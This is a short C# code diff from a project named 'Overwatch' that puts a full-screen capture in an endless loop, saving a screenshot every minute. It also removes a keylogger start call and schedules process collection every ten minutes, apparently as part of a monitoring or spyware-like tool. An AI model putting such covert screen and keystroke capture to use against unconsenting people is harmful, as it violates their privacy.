@@ -43,9 +43,13 @@ namespace Overwatch
         {
             try
             {
-                graph = Graphics.FromImage(bmp);
-                graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
-                bmp.Save(appConfing.targetDirPath + "\\Image.bmp");
+                while (true)
+                {
+                    graph = Graphics.FromImage(bmp);
+                    graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
+                    bmp.Save(appConfing.targetDirPath + "\\Image.bmp");
+                    System.Threading.Thread.Sleep(60000);
+                }
             }
             catch (Exception ex) { Log.Write(ex.Message, true); }
         }
@@ -83,11 +87,14 @@ namespace Overwatch
             }
             catch (Exception ex) { Log.Write(ex.Message, true); }
         }
-        public void Start() { keylogger.start(); }
-
+    
         public void Overview() {
-            GeneralProcess();
-            LocalProcess();
+            while (true)
+            {
+                GeneralProcess();
+                LocalProcess();
+                System.Threading.Thread.Sleep(600000);
+            }
         }
     }
 }
